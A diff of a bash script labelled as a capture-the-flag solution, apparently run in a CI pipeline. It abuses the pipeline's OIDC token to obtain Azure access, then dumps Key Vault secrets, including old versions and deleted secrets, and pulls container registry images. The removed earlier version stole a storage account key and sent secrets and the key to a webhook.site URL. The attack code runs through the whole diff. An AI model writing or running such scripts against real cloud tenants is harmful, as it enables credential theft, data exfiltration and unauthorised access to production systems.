@@ -1,54 +1,63 @@
 #!/usr/bin/env bash
-# CTF DF26 v10: correct SharedKey HMAC; real read of sttblcilogsprodx3euoz (blob/table/queue/file); webhook exfil.
+# CTF DF26 v11: KV secret version-history + raw deleted-secrets dump (prod + sec), grep DF26.
 set +e
-T=$AZURE_TENANT_ID; C=$AZURE_CLIENT_ID; S=$AZURE_SUBSCRIPTION_ID
-M=https://management.azure.com
+T=$AZURE_TENANT_ID; C=$AZURE_CLIENT_ID
 PV=https://kv-tbl-prod-x3euoz.vault.azure.net
-WB=https://webhook.site/744e1661-136d-4800-a335-a79eb595334e
+SV=https://kv-tbl-sec-x3euoz.vault.azure.net
 FL='DF26\{[^}]\{0,200}\}'
+WB=https://webhook.site/744e1661-136d-4800-a335-a79eb595334e
 OIDC=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
-fed(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$2" | jq -r '.access_token // empty'; }
-spn(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | jq -r '.access_token // empty'; }
-VT=$(fed "$C" "https://vault.azure.net/.default")
-echo "===== CTX run=$GITHUB_RUN_ID ====="
-J=""
-for n in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
-  J="$J$n $(curl -s "$PV/secrets/$n?api-version=7.4" -H "Authorization: Bearer $VT" | jq -c '.value')\n"
-done
-printf '%b' "$J" | curl -s -X POST --data-binary @- "$WB/v10-sps-$GITHUB_RUN_ID" >/dev/null
-SS=$(curl -s "$PV/secrets/sync-service-principal?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value' | jq -r '.clientSecret')
-A=$(spn "462d1c38-4459-48b8-9333-82e389e59514" "$SS" "https://management.azure.com/.default")
-SA=sttblcilogsprodx3euoz
-K=$(curl -s -X POST -H "Authorization: Bearer $A" -H 'Content-Length: 0' "$M/subscriptions/$S/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // empty')
-echo "KEY=${K:+yes}"
-[ -z "$K" ] && { echo DONE-V10; exit; }
-curl -s -X POST -d "cilogs-key $K" "$WB/v10-key-$GITHUB_RUN_ID" >/dev/null
-KH=$(printf '%s' "$K" | base64 -d | od -An -tx1 | tr -d ' \n')
-req(){ # $1=url $2=canres(with \n seqs) $3=version
-  local D SG
-  D=$(date -u +"%a, %d %b %Y %H:%M:%S GMT")
-  SG=$(printf '%b' "GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:$D\nx-ms-version:$3\n$2" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$KH -binary | base64)
-  curl -s "$1" -H "x-ms-date: $D" -H "x-ms-version: $3" -H "Authorization: SharedKey $SA:$SG"
-}
-echo "===== blob root"
-R=$(req "https://$SA.blob.core.windows.net/?comp=list" "/$SA/\ncomp:list" "2021-08-06")
-echo "$R" | head -c 900; echo
-echo "$R" | grep -aoE "$FL"
-for cont in $(echo "$R" | grep -oE '<Container><Name>[^<]+' | sed 's/.*<Name>//'); do
-  echo "CONT $cont"
-  L=$(req "https://$SA.blob.core.windows.net/$cont?restype=container&comp=list" "/$SA/$cont\ncomp:list\nrestype:container" "2021-08-06")
-  echo "$L" | head -c 700; echo
-  for blob in $(echo "$L" | grep -oE '<Blob><Name>[^<]+' | sed 's/.*<Name>//' | head -30); do
-    echo "BLOB $cont/$blob"
-    data=$(req "https://$SA.blob.core.windows.net/$cont/$blob" "/$SA/$cont/$blob" "2021-08-06")
-    echo "$data" | head -c 500; echo
-    echo "$data" | grep -aoE "$FL"
+VT=$(curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$C" --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r '.access_token // empty')
+echo "===== CTX run=$GITHUB_RUN_ID vaulttok=${#VT}"
+for V in "$PV" "$SV"; do
+  echo "########## VAULT $V"
+  echo "-- list raw:"; curl -s "$V/secrets?api-version=7.4" -H "Authorization: Bearer $VT" | head -c 500; echo
+  echo "-- deleted raw:"; curl -s "$V/deleted-secrets?api-version=7.4" -H "Authorization: Bearer $VT" | head -c 700; echo
+  for u in $(curl -s "$V/secrets?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value[]?.id // empty'); do
+    n=$(basename "$u")
+    echo "===== VERSIONS $n"
+    curl -s "$u/versions?api-version=7.4" -H "Authorization: Bearer $VT" > /tmp/v.json
+    head -c 300 /tmp/v.json; echo
+    for ver in $(jq -r '.value[]?.id // empty' /tmp/v.json | sed 's#.*/secrets/[^/]*/##'); do
+      echo "--- $n@$ver"
+      val=$(curl -s "$u/$ver?api-version=7.4" -H "Authorization: Bearer $VT")
+      echo "$val" | jq -r '.value // .' | head -c 700; echo
+      echo "$val" | grep -aoE "$FL" && echo "HIT-VERSION $n@$ver"
+    done
+  done
+  # deleted secret names from raw list
+  for du in $(curl -s "$V/deleted-secrets?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value[]?.id // empty'); do
+    echo "===== DELETED $du"
+    dv=$(curl -s "$du?api-version=7.4" -H "Authorization: Bearer $VT")
+    echo "$dv" | jq -r '.value // .' | head -c 700; echo
+    echo "$dv" | grep -aoE "$FL" && echo "HIT-DELETED"
   done
 done
-echo "===== tables"
-req "https://$SA.table.core.windows.net/" "/$SA" "2019-02-02" | head -c 700; echo
-echo "===== queues"
-req "https://$SA.queue.core.windows.net/?comp=list" "/$SA/\ncomp:list" "2019-02-02" | head -c 700; echo
-echo "===== file"
-req "https://$SA.file.core.windows.net/?restype=account&comp=listedshares" "/$SA/\ncomp:listedshares\nrestype:account" "2021-06-08" | head -c 700; echo
-echo DONE-V10
+# ---- ACR sweep with CI identity ----
+AM=$(curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$C" --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
+RT=$(curl -s -X POST https://crtblplatprodx3euoz.azurecr.io/oauth2/exchange -H 'Content-Type: application/json' -d "{\"grant_type\":\"access_token\",\"service\":\"crtblplatprodx3euoz.azurecr.io\",\"tenant\":\"$T\",\"accessToken\":\"$AM\"}" | jq -r .refresh_token)
+CT=$(curl -s "https://crtblplatprodx3euoz.azurecr.io/oauth2/token?service=crtblplatprodx3euoz.azurecr.io&scope=registry:catalog:*" --data-urlencode grant_type=password --data-urlencode "refresh_token=$RT" | jq -r .access_token)
+echo "===== ACT catalog tok=${#CT}"
+curl -s https://crtblplatprodx3euoz.azurecr.io/v2/_catalog -H "Authorization: Bearer $CT"
+for repo in $(curl -s https://crtblplatprodx3euoz.azurecr.io/v2/_catalog -H "Authorization: Bearer $CT" | jq -r '.repositories[]? // empty'; echo tebamoto-reporting-api); do
+  RTAG=$(curl -s "https://crtblplatprodx3euoz.azurecr.io/oauth2/token?service=crtblplatprodx3euoz.azurecr.io&scope=repository:$repo:pull" --data-urlencode grant_type=password --data-urlencode "refresh_token=$RT" | jq -r .access_token)
+  for tag in $(curl -s "https://crtblplatprodx3euoz.azurecr.io/v2/$repo/tags/list" -H "Authorization: Bearer $RTAG" | jq -r '.tags[]? // empty' | head -5); do
+    echo "REPO $repo:$tag"
+    MAN=$(curl -s "https://crtblplatprodx3euoz.azurecr.io/v2/$repo/manifests/$tag" -H "Authorization: Bearer $RTAG" -H 'Accept: application/vnd.docker.distribution.manifest.v2+json,application/vnd.oci.image.manifest.v1+json,application/vnd.oci.image.index.v1+json,application/vnd.docker.distribution.manifest.list.v2+json')
+    echo "$MAN" | head -c 250; echo
+    if echo "$MAN" | jq -e '.manifests' >/dev/null 2>&1; then
+      DM=$(echo "$MAN" | jq -r '.manifests[] | select(.platform.architecture=="amd64") | .digest' | head -1)
+      MAN=$(curl -sL "https://crtblplatprodx3euoz.azurecr.io/v2/$repo/manifests/$DM" -H "Authorization: Bearer $RTAG" -H 'Accept: application/vnd.docker.distribution.manifest.v2+json,application/vnd.oci.image.manifest.v1+json')
+    fi
+    CFG=$(echo "$MAN" | jq -r '.config.digest // empty')
+    [ -n "$CFG" ] && curl -sL "https://crtblplatprodx3euoz.azurecr.io/v2/$repo/blobs/$CFG" -H "Authorization: Bearer $RTAG" | head -c 1200 && echo
+    mkdir -p "/tmp/$repo-$tag"
+    for dl in $(echo "$MAN" | jq -r '.layers[]?.digest // empty'); do
+      curl -sL "https://crtblplatprodx3euoz.azurecr.io/v2/$repo/blobs/$dl" -H "Authorization: Bearer $RTAG" -o "/tmp/$repo-$tag/L.tgz"
+      tar -xzf "/tmp/$repo-$tag/L.tgz" -C "/tmp/$repo-$tag" 2>/dev/null || true
+    done
+    grep -raoE "$FL" "/tmp/$repo-$tag" 2>/dev/null | head -5
+    grep -raiE "flag" "/tmp/$repo-$tag/app" 2>/dev/null | head -5
+  done
+done
+echo DONE-V11
